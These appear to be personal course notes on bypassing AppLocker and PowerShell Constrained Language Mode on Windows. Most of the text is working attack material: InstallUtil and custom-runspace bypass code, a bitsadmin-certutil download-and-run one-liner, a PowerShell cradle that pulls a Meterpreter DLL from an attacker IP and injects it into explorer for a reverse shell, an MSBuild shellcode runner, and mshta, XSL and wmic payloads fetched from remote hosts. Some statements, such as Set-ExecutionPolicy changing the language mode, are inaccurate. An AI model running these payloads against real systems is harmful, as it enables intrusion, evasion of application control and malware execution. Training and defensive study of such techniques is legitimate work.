### Application Whitelisting Theory

- `PsSetCreateProcessNotifyRoutineEx` is a MS kernel-mode API that registers a notification callback allowing the system to determine if the process may run
- **Applocker** helps control what applications can run on a system
	- By default, AppLocker policy only applies to code launched in a user's context. On Windows 10, Windows 11, and Windows Server 2016 or later, you can apply AppLocker policy to non-user processes, including those running as SYSTEM.
- **AppLocker** is included with all editions of Windows except Windows 10 version 1809 or earlier.
- Another whitelisting solution was introduced by MS. Windows Defender Application Control (WDAC) performs whitelisting actions in both user- and kernel-mode
- WDAC was introduced with Windows 10 and allows organizations to control which drivers and applications are allowed to run on their Windows clients.


##### Feature Availability of Applocker and WDAC
- https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/feature-availability

### 8.1.2 Applocker Setup and Rules

##### Rules
- filepath
- file hash (SHA256 Authenticode...code signing)
- digital signature (aka publisher)
	- allows version updates

##### Setup
- In the Local Group Policy Editor, we'll navigate to _Local Computer Policy_ -> _Computer Configuration_ -> _Windows Settings_ -> _Security Settings_ -> _Application Control Policies_ and select the _AppLocker_ item
- Configuration
	- Configure rule enforcement
	- set rule properties for Executable, Windows installer files, scripts, packaged apps

### 8.2 Basic Bypasses

#### 8.2.1 Trusted Folders

- use **AccessChk** from SysInternals to locate user-writable folders
- -w to locate writable directories, -u to suppress any errors and -s to recurse through all subdirectories
```cmd
accesschk.exe "user" C:\Windows -wus
```
- can then use `icacls` to determine directories where can write and execute like `C:\Windows\Tasks`
- another directory that has WD and RX permissions in the lab environment is `c:\windows\system32\spool\drivers\color\`

#### 8.2.2 Bypass with DLLs

- default ruleset doesn't protect against loading arbitrary DLLs
- create an unmanaged DLL like
```c
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```
- compile and use `rundll32` tool to execute `rundll32 <path to dll>\name.dll,run`
- GPO Advanced rule to enable DLL enforcement

##### Extra Mile:
- Code signing bypass example: https://forensicitguy.github.io/making-meterpreter-look-google-signed/
- other ways to embed a non-java payload with a signed msi?

#### 8.2.3 Alternate Data Streams

- **Alternate Data Stream (ADS)** is a binary file attribute that contains metadata
- can use this to append additional information to the original file
- Find a file in a trusted location that is writeable and executable
	- *TODO:* write a cmd script that finds files with these attributes
- Use `type` command to copy malicious content into an ADS
	- Example: `type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"`
	- use `wscript` and specify the ADS to get code execution

#### 8.2.4 Third Party Execution

- Check for 3rd party scripting engines (Perl, Python, etc...)
- "Even more interesting is the lack of enforcement against VBA code inside Microsoft Office documents. If a Microsoft Office document is saved to a non-whitelisted folder, AppLocker cannot restrict execution of its embedded macros, allowing for reuse of our previously developed tradecraft. This highlights the usefulness of Office documents in client-side attacks."

### 8.3 Bypassing Applocker with Powershell

#### Powershell language modes

PowerShell's language modes determine what scripts and commands can be executed in a given session. There are four primary language modes:

1. **Full Language Mode**:
    - **Description**: This mode provides full access to the PowerShell language. Users can run all cmdlets, functions, scripts, and access the .NET Framework.
    - **Restrictions**: None.
    - **Usage**: Suitable for administrators and trusted users who need full control.

2. **Constrained Language Mode**:
    - **Description**: This mode restricts some scripting capabilities, primarily to enhance security and prevent potentially malicious scripts from running.
    - **Restrictions**:
        - .NET types and methods are restricted to a safe list.
        - Only core cmdlets and functions are allowed.
        - No access to COM objects.
        - Limited access to the .NET Framework.
    - **Bypass**: To switch to Full Language Mode, a user with administrative privileges can change the execution policy using the `Set-ExecutionPolicy` cmdlet.

3. **Restricted Language Mode**:
    - **Description**: The most restricted mode, primarily used in environments like Just Enough Administration (JEA) to tightly control what scripts and commands can be executed.
    - **Restrictions**:
        - No user-defined functions, scripts, or workflows.
        - Only a subset of cmdlets and functions allowed.
        - No access to the .NET Framework or COM objects.
    - **Bypass**: Generally, cannot be bypassed directly. Administrators would need to reconfigure the session's language mode.

4. **NoLanguage Mode**:
    - **Description**: This mode completely disables the PowerShell scripting language. Only allowed cmdlets and functions can be executed.
    - **Restrictions**:
        - No script blocks, variables, functions, aliases, or expressions.
        - Only a predefined list of cmdlets and functions is allowed.
    - **Bypass**: Switching out of NoLanguage Mode requires administrative privileges to reconfigure the language mode.

### Changing Language Modes

Language modes are typically enforced in specific PowerShell sessions or environments. Here’s how you can change the language mode for a session:

```powershell
# To change the language mode, you need to update the LanguageMode property of the session state
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
$ExecutionContext.SessionState.LanguageMode = "RestrictedLanguage"
$ExecutionContext.SessionState.LanguageMode = "NoLanguage"
```

### Security Considerations

- **Full Language Mode**: Should be used with caution and restricted to trusted users and environments due to its unrestricted capabilities.
- **Constrained Language Mode**: Provides a balance between usability and security, making it suitable for less trusted environments.
- **Restricted and NoLanguage Modes**: Offer the highest levels of security and are ideal for tightly controlled administrative environments.

### Summary

PowerShell's language modes are crucial for controlling script execution and maintaining security in various environments. Understanding each mode's restrictions and capabilities helps in configuring PowerShell sessions appropriately based on security requirements.


### 8.3.2. Custom Runspaces

#### C\# App to create a Runspace to bypass Powershell constraints

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

\\ Note: need to add this dll into Reference Assemblies
\\C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll.

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
        }
    }
}
```

- Can change the cmd string to perform actions like
	- run PowerUp from a web cradle
	- shellcode execution
- *Note:* need to verify that Applocker isn't blocking. Placing the .exe in c:\\windows\\tasks or another directory where the user and write and execute is required if Applocker or other whitelist blocking is enabled.

### 8.3.3. PowerShell CLM Bypass

`InstallUtil.exe` is a command-line utility that is part of the .NET Framework. It is primarily used for installing and uninstalling .NET assemblies, typically for Windows Services. However, like many legitimate tools, `InstallUtil.exe` can be abused by attackers for malicious purposes. Here are several ways in which `InstallUtil.exe` can be abused:

### 1. **Execution of Malicious Code**
Attackers can create a .NET assembly with custom code in the `Install` and `Uninstall` methods. When `InstallUtil.exe` is run against this assembly, it will execute the malicious code contained in these methods.

#### Example:
A simple .NET assembly with malicious code in the `Install` method:
```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

namespace MaliciousCode
{
    [RunInstaller(true)]
    public class MaliciousInstaller : Installer
    {
        public override void Install(IDictionary stateSaver)
        {
            base.Install(stateSaver);
            Process.Start("cmd.exe"); // or any other malicious command
        }

        public override void Uninstall(IDictionary savedState)
        {
            base.Uninstall(savedState);
            Process.Start("cmd.exe"); // or any other malicious command
        }
    }
}
```
Compile this code into an assembly, and then run it using `InstallUtil.exe`:
```
InstallUtil.exe MaliciousCode.dll
```
POC to bypass Powershell CLM:
```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```
To run the code: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe`
### 2. **Bypassing Application Whitelisting**
Since `InstallUtil.exe` is a legitimate Microsoft-signed binary, it is often whitelisted by application whitelisting solutions. Attackers can exploit this to execute their payloads without triggering alarms.

### 3. **Fileless Malware**
`InstallUtil.exe` can be used to load and execute code directly from memory, which can be part of a fileless malware attack, making it harder for traditional antivirus solutions to detect.

### 4. **Persistence Mechanism**
Attackers can use `InstallUtil.exe` to ensure their malicious code is executed upon system reboots or service restarts by installing it as a service.

### Detection and Mitigation
1. **Monitoring and Logging:** Monitor the execution of `InstallUtil.exe` with tools like Sysmon or Endpoint Detection and Response (EDR) solutions. Look for unusual usage patterns or executions from unexpected directories.
2. **Application Whitelisting:** Configure whitelisting solutions to allow `InstallUtil.exe` only when it is invoked by legitimate software installation processes.
3. **Code Signing:** Enforce code signing for all scripts and binaries executed in your environment.
4. **Endpoint Protection:** Use endpoint protection solutions that can detect and prevent the execution of malicious payloads, even those executed by legitimate tools.

### Example of Detection Rule
A sample YARA rule to detect unusual usage of `InstallUtil.exe`:
```yara
rule Suspicious_InstallUtil_Usage
{
    meta:
        description = "Detects unusual usage of InstallUtil.exe"
    strings:
        $s1 = "InstallUtil.exe"
        $s2 = "-install" // commonly used flag with InstallUtil
    condition:
        all of them
}
```

In summary, while `InstallUtil.exe` is a useful utility for legitimate administrative tasks, it can be exploited by attackers to execute malicious code, bypass security controls, and maintain persistence. Proper monitoring, logging, and security configurations are essential to detect and mitigate such abuses.

#### CLM Bypass Process

- Using Bypass.exe as developed in the course material
- *Issues:*
	- have to download the exe
	- ensure the exe is not flagged by AV/EDR
- Bypass AV obfuscate the exe during download by base64 encoding it either on a separate Windows machine or Linux (might need to pipe to iconv if on Linux)
```cmd
certutil -encode C:\<path to exe> <filename>.txt
```
- Powershell command to encode, but certutil will make the exe look more like a security certificate
```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\<path to exe>")) > C:<path to text ouput file>
```
- To transfer the encoded exe to the victim machine, one can use `bitsadmin` rather than `certutil` which will trigger an AV scan
```cmd
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file>
```
- Now decode the encoded  file
```cmd
certutil -decode encoded.txt Bypass.exe
```
- Then run
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```
- As a one-liner:
```cmd 
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file> &&certutil -decode encoded.txt Bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```

### 8.3.4. Reflective Injection Returns

- using a 64-bit Meterpreter dll and the `Invoke-ReflectivePEInjection.ps1` script to obtain a reverse shell and bypass Applocker DLL rules
```cmd
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```

## 8.4. Bypassing AppLocker with C\#

##### 8.4.2

- Use Microsoft.Workflow.Compiler.exe to generate an xml file that will compile and run code in a file (here we name test.txt)
- M.W.C.exe takes two arguments
	- First is path to an xml file with compiler flags
	- Path to file containing C# code
- allow compile and load into memory without restrictions
- C# code must contain a class that inherits from the System.Workflow.ComponentModel namespace (eg `public class Run : Activty`)
```powershell
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "test.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output
$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
```
- contents of test.txt
```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

```powershell
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

#### Using MSBuild.exe
- References: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xfc,...,0xd5 };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

- Can build and execute using MSBuild
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad.xml
```


### JScript

`mshta.exe` is a legitimate Windows utility used to execute Microsoft HTML Application (HTA) files. HTA files are essentially HTML documents that have the `.hta` file extension and can run JavaScript, VBScript, or other scripting languages in a standalone window without the restrictions typically placed on scripts running within a web browser.

#### Common Uses of `mshta.exe`
- **Executing HTA Files**: The primary purpose of `mshta.exe` is to open and run HTA files.
- **Running Inline Scripts**: It can also be used to execute scripts directly from the command line.
- **Embedding in HTML**: Often used to create interactive web applications with a greater degree of control over the user interface and system resources than is typically available through standard web pages.

#### Syntax
```sh
mshta.exe <path_to_htafile>
```
Or to execute inline scripts:
```sh
mshta.exe vbscript:Execute("MsgBox(\"Hello World\")")
```

#### Security Considerations
While `mshta.exe` is a legitimate tool, it can be abused by attackers to run malicious scripts. This makes it a common vector for malware and other malicious activities. 

#### Examples of Abuse
- **Running Malicious Scripts**: Attackers can use `mshta.exe` to execute malicious JavaScript or VBScript directly from the command line or via a malicious HTA file.
- **Bypassing Security Measures**: Due to its legitimate nature, `mshta.exe` can sometimes bypass security software that might block more obvious malicious executables.

#### Example of Malicious Use
An attacker might craft a command to download and execute a malicious script:
```sh
mshta.exe "http://malicious.website/malicious.hta"
```

#### Mitigation and Defense
- **Monitoring**: Keep an eye on the execution of `mshta.exe` on endpoints. It is unusual for most users to execute HTA files frequently.
- **Restrict Execution**: Implement policies to restrict the use of `mshta.exe` if it is not required in your environment.
- **Endpoint Protection**: Use endpoint protection solutions that can detect and block the execution of suspicious scripts and HTA files.

By understanding `mshta.exe` and its potential for abuse, you can better protect your systems from associated threats.


#### POC
```js
<html> 
<head> 
<script language="JScript">
<!--- PASTE JSCRIPT PAYLOAD BELOW --->
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
<!--- PASTE JSCRIPT ABOVE--->
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

```cmd
mshta test.hta
```

### XSL Transform
#### Malicious use
- start webserver
- save POC in web root  
- create a shortcut `C:\\Windows\\System32\\mshta.exe http://<attacker ip>/test.hta` and name it
- have to get shortcut file on victim's machine
- Can use DotNetToJscript or SuperSharpShooter to generate payload to plant in the hta file

Using XSLT (Extensible Stylesheet Language Transformations) to bypass AppLocker can be a technique employed by attackers to execute arbitrary code in an environment where AppLocker policies are enforced to restrict executable files. Here's a step-by-step explanation of how this technique might be used:

#### What is XSLT?
XSLT is a language for transforming XML documents into other formats such as HTML, text, or another XML document. 

#### Using XSLT to Execute Code
1. **Craft an XSLT File**: The attacker creates an XSLT file that contains embedded script or commands to be executed. XSLT has elements like `<msxsl:script>` that can contain JScript or VBScript.

2. **Invoke the XSLT File**: The attacker uses a legitimate Windows utility (like `msxsl.exe` or Internet Explorer) to process the malicious XSLT file.

Here's an example of an XSLT file (`malicious.xsl`) with embedded JScript:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
    <msxsl:script language="JScript" implements-prefix="user">
        <![CDATA[
        function execute() {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c calc.exe");
        }
        ]]>
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="user:execute()"/>
    </xsl:template>
</xsl:stylesheet>
```

#### Steps to Bypass AppLocker
1. **Create the Malicious XSLT File**: Save the above XSLT code into a file named `malicious.xsl`.

2. **Invoke the XSLT File**: Use `msxsl.exe` or Internet Explorer to run the XSLT file. For example:

```sh
msxsl.exe input.xml malicious.xsl
```

or

```sh
mshta.exe "about:<html><head><xml id='xsl' src='file:///C:/path/to/malicious.xsl'/><script>new ActiveXObject('Msxml2.DOMDocument.6.0').transformNodeToObject(new ActiveXObject('Msxml2.DOMDocument.6.0').loadXML('<root/>'), document.all.xsl);</script></head><body></body></html>"
```

or 

```cmd
wmic process get brief /format:"http://192.168.0.1/test.xsl"
```

or 

```cmd
wmic process call create "wmic os get /format:'file://C:/path/to/malicious.xsl'"
```

#### Security Implications
- **Bypassing Restrictions**: Since `msxsl.exe` and `mshta.exe` are typically not restricted by AppLocker policies, they can be used to execute arbitrary code through the XSLT transformation process.
- **Misuse of Legitimate Tools**: This technique abuses legitimate system tools, making it harder for security software to detect the malicious activity.

#### Mitigation Strategies
- **Restrict Executable Use**: Restrict the use of tools like `msxsl.exe` and `mshta.exe` if they are not needed in your environment.
- **AppLocker Configuration**: Ensure that AppLocker policies are configured to also restrict the execution of script processors and other tools that can be used to bypass restrictions.
- **Monitoring and Alerts**: Monitor for unusual use of tools like `msxsl.exe` and `mshta.exe` and set up alerts for their execution.

By understanding how XSLT can be used to bypass AppLocker, you can better protect your systems by implementing more comprehensive security measures and monitoring.

